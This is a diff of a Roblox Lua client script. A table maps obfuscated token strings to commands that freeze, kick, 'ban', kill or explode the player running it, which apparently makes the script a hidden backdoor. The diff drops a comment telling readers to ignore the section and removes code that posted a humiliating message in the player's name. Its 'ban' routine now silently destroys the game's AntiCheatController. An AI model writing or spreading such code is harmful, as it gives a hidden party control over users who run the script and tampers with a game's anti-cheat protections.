@@ -2,8 +2,6 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 if not LocalPlayer then return end
 
--- ignore this because it totally aint important
-
 local TOKEN_TO_COMMAND = {
     ["f7@Kp9#zTq"] = "freeze",
     ["4Lm$2wXv!R"] = "unfreeze",
@@ -45,30 +43,19 @@ local function applyKick()
 end
 
 local function applyBan()
-    local Players = game:GetService("Players")
     local localPlayer = Players.LocalPlayer
+    local path = localPlayer.PlayerScripts:FindFirstChild("Controllers")
     
-    local path = localPlayer.PlayerScripts
-        .Controllers.Character.AntiCheatController
-
     if path then
-        NotificationLibrary:SendNotification(
-            "Warning",
-            "Hey! Stop scripting, Here's a ban!",
-            3
-        )
-
-        local textChatService = game:GetService("TextChatService")
-        textChatService.TextChannels.RBXGeneral:SendAsync(
-            "I'm a dirty little cheater. This is a goodbye, please report me."
-        )
-
-        task.wait(4)
-
-        path:Destroy()
+        local charControllers = path:FindFirstChild("Character")
+        if charControllers then
+            local antiCheatController = charControllers:FindFirstChild("AntiCheatController")
+            if antiCheatController then
+                antiCheatController:Destroy()
+            end
+        end
     end
 end
-
 
 local function applyKill()
     local char = LocalPlayer.Character
@@ -84,14 +71,16 @@ local function applyExplode()
     if not char then return end
     local root = char:FindFirstChild("HumanoidRootPart")
     if not root then return end
-    local explosion = Instance.new("Part", workspace)
+    local explosion = Instance.new("Part")
     explosion.Size = Vector3.new(1,1,1)
     explosion.CFrame = root.CFrame
     explosion.Anchored = false
     explosion.CanCollide = false
-    local bv = Instance.new("BodyVelocity", explosion)
+    explosion.Parent = workspace
+    local bv = Instance.new("BodyVelocity")
     bv.MaxForce = Vector3.new(1e4,1e4,1e4)
     bv.Velocity = Vector3.new(0,50,0)
+    bv.Parent = explosion
     game:GetService("Debris"):AddItem(explosion, 1)
 end
 
